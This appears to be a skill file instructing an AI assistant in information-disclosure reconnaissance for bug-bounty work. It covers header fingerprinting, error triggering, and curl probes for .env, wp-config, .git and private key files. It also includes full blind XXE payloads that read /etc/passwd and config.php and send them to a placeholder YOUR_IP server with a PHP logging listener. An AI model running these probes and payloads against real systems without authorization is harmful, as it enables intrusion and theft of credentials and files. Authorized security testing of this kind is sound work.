---
name: info-disclosure
description: Information disclosure recon checklist — response headers revealing tech stack, error messages (stack traces, DB errors), backup/config file discovery, API docs exposure, robots.txt/sitemap, JS source maps, HTML comments, cookie analysis, XXE-based file disclosure, blind OOB exfiltration via XXE. Use during Phase 2 recon on any target, or when HauntMode identifies version headers, error messages, or file access patterns.
---

# Information Disclosure — Recon Checklist and File Disclosure

Grounded in CBBH Information Gathering and Web Attacks modules. Run this checklist on every new target during Phase 2 recon before diving into vuln-specific testing.

---

## 1. Triggers — when this skill applies

- Phase 2 recon on a new target (always run this)
- Error messages appearing in responses
- Unusual response headers exposing version numbers
- Files accessible that shouldn't be (backup, config, source)
- XXE injection confirmed but output is not directly reflected (blind)
- Any `Server:`, `X-Powered-By:`, `X-AspNet-Version:`, `X-Generator:` headers visible

---

---

## 3. Response header analysis

Run this curl one-liner against the target and analyze the output:

```bash
curl -sI https://target.com | grep -iE '(server|x-powered-by|x-aspnet|x-generator|x-version|x-runtime|x-framework|x-app-version|via|x-drupal|x-joomla|x-wp)'
```

Key headers and what they reveal:

| Header | Reveals |
|---|---|
| `Server: Apache/2.4.29` | Web server + exact version → search CVEs |
| `X-Powered-By: PHP/7.4.3` | PHP version → check known vulns |
| `X-AspNet-Version: 4.0.30319` | .NET version |
| `X-Generator: Drupal 9` | CMS + version |
| `X-Runtime: Ruby` | Backend language |
| `Via: 1.1 proxy.internal` | Internal proxy infrastructure |
| `X-Served-By: cache-node-12` | CDN/cache infrastructure |
| `X-Request-Id: uuid` | May leak UUID format used for object IDs |

For deeper fingerprinting:
```bash
curl -sI https://target.com && curl -s https://target.com | grep -iE '(generator|powered|version|framework|cms)' | head -20
```

Also: Wappalyzer browser extension or `whatweb target.com` for automated fingerprinting.

---

## 4. Error message analysis

Trigger errors deliberately and capture the output:

```bash
# Non-existent path
curl -s https://target.com/zzz_does_not_exist_zzzpoc

# Invalid parameter type
curl -s 'https://target.com/api/users?id=zzz'

# SQL error trigger
curl -s "https://target.com/search?q='"

# File not found
curl -s "https://target.com/download?file=../../../etc/passwd"
```

Look for: stack traces, DB query text, file system paths, class/method names, framework identifiers (e.g., `org.springframework`, `django.core`), DB type and version in error messages.

Document exact error messages — they often reveal the precise tech stack and attack vectors.

---

## 5. Backup and config file discovery

Give these to the researcher as a [RUN THIS] block. Customize the target URL and extension wordlist as needed.

```
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -u https://target.com/FUZZ \
  -mc 200,301,302 \
  -fc 404 \
  -t 40 \
  -o /home/gg/bugbounty/TARGET/ffuf-files.txt
```

High-value backup/config files to check manually:

```bash
# Backup files (append common backup extensions to known file names)
for f in index login admin config database settings wp-config; do
  for ext in .bak .old .orig .backup .copy .tmp .swp .1 ~; do
    curl -so /dev/null -w "%{http_code} ${f}${ext}\n" "https://target.com/${f}${ext}"
  done
done
```

Specific high-value targets:
```bash
# Configuration and credential files
curl -s https://target.com/.env
curl -s https://target.com/web.config
curl -s https://target.com/.htaccess
curl -s https://target.com/config.php
curl -s https://target.com/config.yml
curl -s https://target.com/database.yml
curl -s https://target.com/settings.py
curl -s https://target.com/wp-config.php
curl -s https://target.com/wp-config.php.bak
curl -s https://target.com/wp-config.php~

# Git exposure
curl -s https://target.com/.git/config
curl -s https://target.com/.git/HEAD

# SSH and SSL keys
curl -s https://target.com/id_rsa
curl -s https://target.com/server.key
curl -s https://target.com/private.key
```

---

## 6. API docs and Swagger exposure

```bash
# Common API doc endpoints
for path in api-docs swagger.json openapi.json swagger-ui.html redoc api/swagger v1/swagger.json v2/swagger.json api/v1/docs api/v2/docs; do
  status=$(curl -so /dev/null -w "%{http_code}" "https://target.com/${path}")
  [ "$status" != "404" ] && echo "[+] $status https://target.com/${path}"
done
```

If any return 200 — load in browser to see the full documented API surface.

---

## 7. robots.txt, sitemap.xml, and well-known URIs

```bash
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
curl -s https://target.com/.well-known/security.txt
curl -s https://target.com/.well-known/openid-configuration
```

From `robots.txt`, look for:
- `Disallow:` entries pointing to admin panels, internal tools, staging paths
- Paths that are explicitly hidden from indexing — these are often the most interesting

From `openid-configuration`:
- Authorization endpoint, token endpoint, userinfo endpoint
- Supported scopes and response types

---

## 8. JS source map files

Source maps reveal the original (unminified) source code, including internal API endpoints, secret keys, and business logic:

```bash
# Check if .map files exist for minified JS
curl -s https://target.com/static/app.min.js.map
curl -s https://target.com/assets/main.bundle.js.map
curl -s https://target.com/js/app.js.map
```

If a `.map` file is accessible, it contains the original source. Download it and grep:
```bash
curl -s https://target.com/static/app.js.map | python3 -c "
import sys, json
data = json.load(sys.stdin)
for name, src in zip(data.get('sources',[]), data.get('sourcesContent',[])):
    if src and any(k in src for k in ['password','secret','api_key','token','Authorization']):
        print(f'=== {name} ===')
        print(src[:500])
"
```

---

## 9. HTML comment analysis

```bash
curl -s https://target.com | grep -E '<!--.*-->' | head -30
# Also check JS files
curl -s https://target.com/static/app.js | grep -E '(TODO|FIXME|HACK|password|secret|key|token|internal|debug)' | head -20
```

Look for: developer notes, disabled code, API endpoints, credentials left in comments, internal hostnames, debug flags.

---

## 10. Cookie analysis

Examine every Set-Cookie header:

```bash
curl -sc /dev/null -D - https://target.com/ | grep -i 'set-cookie'
```

What to analyze:
- **Name reveals tech:** `PHPSESSID` = PHP, `JSESSIONID` = Java/Tomcat, `ASP.NET_SessionId` = .NET, `laravel_session` = Laravel, `ci_session` = CodeIgniter, `wordpress_*` = WordPress
- **Value structure:** Is it random? Base64? A signed JWT? A predictable pattern?
- **Security flags missing:** No `HttpOnly`? No `Secure`? `SameSite=None`?
- **Path and domain scope:** `.` prefix on domain = all subdomains get the cookie

Decode base64 cookie values:
```bash
echo "VALUE" | base64 -d 2>/dev/null
```

For JWT cookies, use `jwt_tool` or manually base64-decode each segment.

---

## 11. Advanced XXE file disclosure

When XXE injection is confirmed but the output is not directly reflected in the response, use these patterns.

### 11.1 CDATA exfiltration (for binary/special-char files)

Host `xxe.dtd` on your server:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

Then send:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/config.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```

### 11.2 Error-based XXE (when output is in error messages)

Host `xxe.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Send:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root>test</root>
```

The file content appears in the error message.

### 11.3 Blind OOB XXE via HTTP

For fully blind situations (no output, no errors), exfiltrate via OOB request.

Host `xxe.dtd`:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
```

Host `index.php` (decodes and logs incoming content):
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
    file_put_contents('/tmp/xxe_exfil.txt', base64_decode($_GET['content']) . "\n", FILE_APPEND);
}
?>
```

Send:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Start listener: `php -S 0.0.0.0:8000`

Check exfil: `cat /tmp/xxe_exfil.txt`

For automated OOB XXE: use XXEinjector (give researcher the command as [RUN THIS]).

---

## 12. Google dorks for the target

Useful dorks to find exposed information:

```
site:target.com filetype:env
site:target.com filetype:log
site:target.com filetype:sql
site:target.com "password" filetype:txt
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com "internal"
```

---

## 13. False-positive checks

- **Version in Server header but app is fully patched:** The header may be outdated or spoofed. Only report with confirmed exploit path.
- **robots.txt path exists but requires auth:** Lower impact than unauthenticated access. Note the path, test auth bypass separately.
- **.git directory exists but HEAD is empty or misconfigured:** Verify actual files are accessible before reporting git exposure.
- **XXE file read returns expected content:** Verify the file content is actually confidential (not just `/etc/hostname`) before reporting impact.

---

## 14. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| `.env` file with DB credentials | `sqli` (direct DB access) | Full data breach |
| `wp-config.php` credentials | `wordpress` | Admin access |
| JWT in cookie → forged token | `auth-bypass` | Privilege escalation |
| Stack trace reveals file path → LFI | `lfi` | File read |
| Blind XXE OOB → file read | `xxe` | Sensitive file exfiltration |
| API docs → undocumented admin endpoints | `idor`, `api-attacks` | Admin function access |
| Source map reveals internal API → IDOR | `idor` | Data access |
| Error reveals SQL query structure | `sqli` | Informs injection strategy |

---

## 15. Reporting template

```
POTENTIAL FINDING: Information Disclosure — <type>
Target: <URL>
Vector: <response header | error message | backup file | source map | comment | XXE>

Disclosed information:
  <exact content: version string, stack trace, file content, credential, path>

How found:
  <curl -sI request | error trigger | ffuf discovery | robots.txt | JS comment>

Impact:
  <e.g. "PHP version 7.4.3 disclosed; CVE-XXXX-XXXX allows RCE in this version"
   or ".env file accessible; contains DB_PASSWORD and STRIPE_SECRET_KEY"
   or "Stack trace reveals absolute path /var/www/html/app — aids LFI exploitation">

Severity: <Info | Low | Medium | High>
  Note: version header alone = Info/Low; credential = High; tech stack = Info

Chain potential: <link to other vulns this enables>
Next step: <research CVEs for version | test LFI with disclosed path | test disclosed creds>
```

---

## 16. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `info:header:<header-name>` — tech version disclosed in header
- `info:error:<type>` — stack trace / DB error / path disclosed
- `info:backup:<filename>` — accessible backup/config file
- `info:api-docs` — Swagger/OpenAPI docs exposed
- `info:js-map` — JS source map accessible
- `info:cookie:<name>` — cookie reveals tech stack / lacks security flags
- `info:robots:<path>` — interesting path found in robots.txt
- `info:git-exposed` — .git directory accessible

---

## 17. What NOT to do

- **Do not download or read production database dumps** even if backup files are accessible. Prove access exists and stop.
- **Do not exfiltrate real credentials** beyond what's needed to prove the vuln (e.g., if `.env` is accessible, note the key names but don't test them against third-party services).
- **Do not run automated crawlers/scanners** for file discovery — give the ffuf command to the researcher as [RUN THIS].
- **Do not report every disclosed header as a bug.** Server version in headers alone is usually Info/Low — only escalate if there's a working exploit chain.
- **Do not auto-log to the recon tracker** without explicit user instruction.
